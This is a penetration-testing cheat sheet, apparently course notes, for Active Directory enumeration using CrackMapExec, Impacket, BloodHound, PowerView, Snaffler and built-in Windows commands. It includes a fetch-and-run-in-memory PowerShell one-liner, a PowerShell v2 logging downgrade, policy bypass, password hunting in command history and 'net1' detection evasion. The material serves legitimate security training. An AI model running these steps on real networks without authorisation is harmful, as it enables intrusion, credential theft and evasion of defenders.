### Content
1. [From Linux Host](#from-linux-host)
	- [Crackmapexec or NetExec](#crackmapexec-or-netexec)
	- [SMBMap](#smbmap)
	- [rpcclient](#rpcclient)
	- [Impacket Toolkit](#impacket-toolkit)
	- [Windapsearch](#windapsearch)
	- [BloodHound](#bloodhound)
2. [From Windows Host](#from-windows-host)
	- [ActiveDirectory Module](#activedirectory-module)
	- [PowerView](#powerview)
	- [Snaffler](#snaffler)
3. [Living Off the Land](#living-off-the-land)
	- [Basic Enumeration](#basic-enumeration)
	- [Network Enumeration](#network-enumeration)
	- [WMI](#wmi)
	- [NET](#net)
	- [Dsquery](#dsquery)
---
# From Linux Host

#### Crackmapexec or NetExec  
``` bash
# Domain User Enumeration (retrieve a list of all domain users).
$ sudo crackmapexec smb 172.16.5.5 -u username -p password --users
# List of domain groups.
$ sudo crackmapexec smb 172.16.5.5 -u username -p password --groups
# List logged on users
$ sudo crackmapexec smb 172.16.5.130 -u username -p password --loggedon-users
# Shares enumeartion
$ sudo crackmapexec smb 172.16.5.5 -u username -p password --shares
	# The module spider_plus will dig through each readable share on the host and list all readable files.
	$ sudo crackmapexec smb 172.16.5.5 -u username -p password -M spider_plus --share 'Department Shares'
	# When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>.
```

#### SMBMap
``` bash
# Shares enumeartion
$ smbmap -u username -p password -d DOMAIN.LOCAL -H 172.16.5.5
	# Recursive List Of All Directories
	$ smbmap -u username -p password -d DOMAIN.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

#### rpcclient
``` bash
# Abuse SMB NULL session
$ rpcclient -U "" -N 172.16.5.5
# Enumerate all usernames after logging in with credentials or abusing the SMB NULL session
rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
# Enumerate specific user
rpcclient $> queryuser 0x1f4
```

#### Impacket Toolkit
``` bash
# To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
# psexec.py utilizes an interactice shell
$ psexec.py domain.local/username:'password'@IP

# Wmiexec.py utilizes a semi-interactive shell
# This is a more stealthy approach
$wmiexec.py domain.local/username:'password'@IP 
```

#### Windapsearch
``` bash
# Enumerate domain admins group members
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u user@domain.local -p password --da
# Find privileged users
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u user@domain.local -p password -PU
```

#### BloodHound
[BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
``` bash
$ sudo bloodhound-python -u 'username' -p 'password' -ns DC-IP -d domain.local -c all

$ ls
20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json 

$ zip -r file.zip *.json

# sudo neo4j start to start the neo4j service
# go to localhost:7474 to set a username and a password
# user == neo4j / pass == root
# open bloodhound and clikc on upload data and select the zip file
```

---
# From Windows Host
#### ActiveDirectory Module
[ActiveDirectory PowerShell module ](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
``` Powershell
# Check whether the module is imported and import it if not
PS C:\Users> get-module
# Import it if it's not imported
PS C:\Users> import-module ActiveDirectory
# Get Domain Info
PS C:\Users> Get-ADDomain
# filtering for accounts with the ServicePrincipalName property populated.
# This will get us a listing of accounts that may be susceptible to a Kerberoasting attack
PS C:\Users> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# Checking for any trust relationships the domain has
PS C:\Users> Get-ADTrust -Filter *
# Group Enumeration
PS C:\Users> Get-ADGroup -Filter * | select name
# Get more detailed information about a particular group
PS C:\Users> Get-ADGroup -Identity "Group Name from above"
# Get a member listing from the group above
PS C:\Users> Get-ADGroupMember -Identity "Group Name from above"
```

#### PowerView
[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
``` Powershell
# Information of a specific user in a specific domain
PS C:\Users> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local
# Information of all users in a domain
PS C:\Users> Get-DomainUser -Domain inlanefreight.local
# Enumerate a domain group members and also list it's nested groups members of there was any
PS C:\Users> Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# Trust Enumeration
PS C:\Users> Get-DomainTrustMapping
# Testing for Local Admin Access on a specific machine (current or remote machine).
PS C:\Users> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
# Check for users with the SPN attribute set (may be subjected to a Kerberoasting attack).
PS C:\Users> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# SharpView .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView.
# type a method name with `-Help` to get an argument list.
PS C:\Users> .\SharpView.exe Get-DomainUser -Help
# Enumerate information about a specific user
PS C:\Users> .\SharpView.exe Get-DomainUser -Identity forend
# SharpView can be more beneficial in an environment hardened against powershell usage. 
```

#### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment.
works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment.
``` Powershell
PS C:\Users> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
---
# Living Off the Land
The techniques here for testing AD environment from a managed `Windows` host with no internet access, and all efforts to load tools onto it have failed.
#### Basic Enumeration

| **Command**                                                                                                                | **Result**                                                                                                                                                                                                                                    |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hostname`                                                                                                                 | Prints the PC's Name                                                                                                                                                                                                                          |
| `[System.Environment]::OSVersion.Version`                                                                                  | Prints out the OS version and revision level                                                                                                                                                                                                  |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                                    | Prints the patches and hotfixes applied to the host                                                                                                                                                                                           |
| `ipconfig /all`                                                                                                            | Prints out network adapter state and configurations                                                                                                                                                                                           |
| `set`                                                                                                                      | Displays a list of environment variables for the current session (ran from CMD-prompt)                                                                                                                                                        |
| `echo %USERDOMAIN%`                                                                                                        | Displays the domain name to which the host belongs (ran from CMD-prompt)                                                                                                                                                                      |
| `echo %logonserver%`                                                                                                       | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)                                                                                                                                                    |
| [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo)                   | Print a summary of the host's information for us in one tidy output.                                                                                                                                                                          |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
| `Get-host`                                                                                                                 | Print information about the current PowerShell session.                                                                                                                                                                                       |
| `powershell.exe -version 2`                                                                                                | Change the PowerShell version to a version that has no logging feature if available.                                                                                                                                                          |
| `netsh advfirewall show allprofiles`                                                                                       | [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) utility will help us to see the state of the Windows firewall settings and check the status of the Windows defender.                    |
| `sc query windefend`                                                                                                       | Windows Defender Check (from CMD.exe)                                                                                                                                                                                                         |
| `Get-MpComputerStatus`                                                                                                     | Check Windows defender status and configuration settings                                                                                                                                                                                      |
| `qwinsta`                                                                                                                  | (Query WINdows STAtion) shows current sessions on the host.                                                                                                                                                                                   |

#### Network Enumeration
| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

#### WMI
[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi)
This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

| **Command**                                                                              | **Description**                                                                                                      |
| ---------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                  | Prints the patch level and description of the Hotfixes applied                                                       |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`     | Displays basic host information to include any attributes within the list                                            |
| `wmic process list /format:list`                                                         | A listing of all processes on host                                                                                   |
| `wmic ntdomain list /format:list`                                                        | Displays information about the Domain and Domain Controllers                                                         |
| `wmic useraccount list /format:list`                                                     | Displays information about all local accounts and any domain accounts that have logged into the device               |
| `wmic group list /format:list`                                                           | Information about all local groups                                                                                   |
| `wmic sysaccount list /format:list`                                                      | Dumps information about any system accounts that are being used as service accounts.                                 |
| `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress` | Information about the domain and the child domain, and the external forest that our current domain has a trust with. |

#### NET
[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2)

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user /domain username`                     | Information about a domain user                                                                                              |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

> [!Important]
> If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
> 
> `net view` --> `net1 view`

#### Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

All we need is `elevated privileges` on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context.

[dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11))

``` PowerShell
# User Search
PS C:\> dsquery user
# Computer Search
PS C:\> dsquery computer
# dsquery wildcard search to view all objects in an OU.
PS C:\> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Combine `dsquery` with LDAP filters.
``` PowerShell
# Users With Specific Attributes Set (PASSWD_NOTREQD) -> password not required
PS C:\> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Look for all Domain Controllers in the current domain, limiting to five results.
PS C:\> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

- `-filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"`
	- `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object.
		- This portion can change to include three different values when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).
			- `1.2.840.113556.1.4.803` --> When using this rule, we are saying the bit value must match completely to meet the search requirements.
			- `1.2.840.113556.1.4.804` --> When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches.
			- `1.2.840.113556.1.4.1941` --> This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
	- `=8192` represents the decimal bitmask we want to match in this search.


#### userAccountControl Values

| Property flag                  | Value in hexadecimal | Value in decimal |
| ------------------------------ | -------------------- | ---------------- |
| SCRIPT                         | 0x0001               | 1                |
| ACCOUNTDISABLE                 | 0x0002               | 2                |
| HOMEDIR_REQUIRED               | 0x0008               | 8                |
| LOCKOUT                        | 0x0010               | 16               |
| PASSWD_NOTREQD                 | 0x0020               | 32               |
| PASSWD_CANT_CHANGE             | 0x0040               | 64               |
| ENCRYPTED_TEXT_PWD_ALLOWED     | 0x0080               | 128              |
| TEMP_DUPLICATE_ACCOUNT         | 0x0100               | 256              |
| NORMAL_ACCOUNT                 | 0x0200               | 512              |
| INTERDOMAIN_TRUST_ACCOUNT      | 0x0800               | 2048             |
| WORKSTATION_TRUST_ACCOUNT      | 0x1000               | 4096             |
| SERVER_TRUST_ACCOUNT           | 0x2000               | 8192             |
| DONT_EXPIRE_PASSWORD           | 0x10000              | 65536            |
| MNS_LOGON_ACCOUNT              | 0x20000              | 131072           |
| SMARTCARD_REQUIRED             | 0x40000              | 262144           |
| TRUSTED_FOR_DELEGATION         | 0x80000              | 524288           |
| NOT_DELEGATED                  | 0x100000             | 1048576          |
| USE_DES_KEY_ONLY               | 0x200000             | 2097152          |
| DONT_REQ_PREAUTH               | 0x400000             | 4194304          |
| PASSWORD_EXPIRED               | 0x800000             | 8388608          |
| TRUSTED_TO_AUTH_FOR_DELEGATION | 0x1000000            | 16777216         |